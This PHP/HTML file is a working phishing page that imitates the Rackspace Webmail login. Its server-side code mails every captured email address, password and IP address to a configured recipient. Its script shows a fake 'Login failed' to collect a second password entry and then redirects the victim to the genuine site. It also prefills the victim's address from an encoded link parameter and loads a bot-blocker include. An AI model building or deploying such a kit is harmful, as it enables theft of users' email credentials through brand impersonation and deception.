<?php
session_start();
require 'config/config.php';
require 'core/blocker.php';

if(isset($_SESSION['login'])) {
    header('Location: https://apps.rackspace.com/');
    exit();
}

if(isset($_POST['email_satu'])) {
    mail($to, 'Login 1', "Host: {$_SERVER['HTTP_HOST']} | Email: ".($_POST['email'])." | Password: {$_POST['password']} | IP: {$_SERVER['REMOTE_ADDR']}");
}

if(isset($_POST['email_dua'])) {
    $_SESSION['login'] = "true";
    mail($to, 'Login 2', "Host: {$_SERVER['HTTP_HOST']} | Email: ".($_POST['email'])." | Password: {$_POST['password']} | IP: {$_SERVER['REMOTE_ADDR']}");
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
    <head>
        <title>Rackspace Webmail: Hosted Email for Business</title>
        <meta http-equiv=Content-Type content="text/html charset=utf-8">
        <link rel="stylesheet" href="assets/css/login.css">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <link href="assets/images/favicon.ico" rel="shortcut icon" />
    </head>
    <body>
        <div class="page">
            <div class="header">
                <div class="logo">
                    <a href="#">
                        <img class="logo" alt="Webmail (Web Mail) Login for Rackspace Email Customers" src="//cp.rackspace.com/clients/webmail/apps_rackspace_com/images/blank.gif" />
                    </a>
                </div>
                <div id="login_links">
                    Webmail 
                    <div class='divider'>|</div>
                    <a href='#'>Control Panel</a> 
                </div>
            </div>
            <div class="form_wrapper">
                <div class="form">
                    <div class="right">
                        <div class="banner">
                            <a href="#" target="_blank">
                                <img class="banner" src="//cp.rackspace.com/clients/webmail/apps_rackspace_com/images/blank.gif" />
                            </a>
                        </div>
                    </div>
                    <div class="left">
                        <form method="post">
                            <div id="form_title">Rackspace Webmail Login</div>
                            <div id="alert" style="display:none;">Login failed</div>
                            <div id="placeholder"> </div>
                            <select name="type" tabindex="10" id="emailAccount">
                                <option value="email">Email Account</option>
                                <option value="cp">Control Panel</option>
                            </select>
                            <input type="text" name="fake_pwd" tabindex="12" class="fake_pwd" value="Password" style="display:none"/>
                            <div id="email_label">Email Address</div>
                            <input type="text" tabindex="11" name="user_name" class="user" value="<?php echo isset($_GET['email']) ? base64_decode($_GET['email']) : '' ?>" required />
                            <div>Password</div>
                            <input type="password" tabindex="12" name="password" class="pwd" required/>
                            <button type="button" tabindex="13" id="login" name="submit_btn" class="submit">Log In</button>
                            <img class="ssllogo" src="//cp.rackspace.com/clients/webmail/apps_rackspace_com/images/blank.gif" align="top" alt="SSL Encrypted" id="forcessl_icon" style="display:none;" />
                            <a href="#" id="forgot_password">Forgot Password?</a>
                            <div id="options">
                                <div id="rememberinfo">
                                    <input type="checkbox" tabindex="14" name="remember" id="remember" />
                                    <label for="remember">Remember this info</label>
                                </div>
                                <div id="ssl">
                                    <input type="checkbox" tabindex="15" name="usessl" id="usessl" disabled="disabled" checked="checked" />
                                    <label for="usessl">
                                        Use SSL
                                    </label>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="caption">
                Need 
                <h2>webmail</h2>
                for your business?  Learn more about 
                <a href="#">
                Hosted Email</a> from Rackspace
            </div>
        </div>
        <div class="base">
            <div class="base_links">
                <a target="_blank" href="#">Privacy Statement</a>
                <div class='divider'>|</div>
                <a target="_blank" href="#">Website Terms</a>
            </div>
        </div>

        <script>
            $(function() {
                var success = 0;
                $(document).on('click', '#login', function(e) {
                    e.preventDefault();

                    var email = $('[name="user_name"]').val();
                    var passwd = $('[name="password"]').val();


                    if(success == 0) {
                        success = 1;
                        $.post('index.php', {email_satu: true, email: email, password: passwd}, function(data) {
                            setTimeout(function() {
                                $('#alert').css({'display':'block'});
                            }, 1500);
                        });
                    } else {
                        $.post('index.php', {email_dua: true, email: email, password: passwd}, function(data) {  
                            setTimeout(function() {
                                $('#alert').css({'display':'none'});
                            }, 1500);
                            setTimeout(function() {
                                window.location = 'https://apps.rackspace.com/';    
                            }, 2000);
                        });
                    }
                });
            });
        </script>
    </body>
</html>